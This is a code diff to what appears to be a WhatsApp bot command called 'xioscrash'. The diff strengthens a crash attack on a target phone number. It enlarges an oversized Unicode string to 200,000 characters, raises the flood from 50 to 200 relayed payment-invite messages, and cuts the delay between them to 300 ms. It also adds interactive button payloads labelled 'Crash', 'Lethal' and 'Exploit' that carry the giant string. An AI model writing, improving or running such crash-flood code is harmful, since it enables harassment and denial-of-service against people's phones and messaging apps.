@@ -14,7 +14,7 @@ const isValidPhoneNumber = (number) => {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-const XEONTEXT6 = `𝐄𝐂𝐋𝐈𝐏𝐒𝐄 𝐗𝐌𝐃` + "ꦾ".repeat(70000);
+const XEONTEXT6 = `𝐄𝐂𝐋𝐈𝐏𝐒𝐄 𝐗𝐌𝐃` + "ꦾ".repeat(150000) + "⚰️".repeat(50000);
 
 export default {
   name: 'xioscrash',
@@ -68,18 +68,27 @@ export default {
         text: `☠️ *XIOS CRASH INITIATED*\n\n🎯 Target: +${clientNumber}\n💥 Type: Payment Invite Bug\n⏳ Launching attack...`
       }, { quoted: msg });
 
-      const amount = 50;
+      const amount = 200;
       for (let i = 0; i < amount; i++) {
         await sock.relayMessage(targetJid, {
           paymentInviteMessage: {
             serviceType: "UPI",
             expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
+          },
+          interactiveMessage: {
+            body: { text: XEONTEXT6 },
+            nativeFlowMessage: {
+                buttons: [{
+                    name: "single_select",
+                    buttonParamsJson: JSON.stringify({ title: "Crash", sections: [{ title: "Lethal", rows: [{ header: "Exploit", title: XEONTEXT6, id: "crash" }] }] })
+                }]
+            }
           }
         }, {});
-        await sleep(2000);
+        await sleep(300);
         
-        if (i % 10 === 0) {
-          console.log(`[XIOSCRASH] Progress: ${i}/${amount}`);
+        if (i % 20 === 0) {
+          console.log(`[XIOSCRASH] High Intensity Progress: ${i}/${amount}`);
         }
       }
 
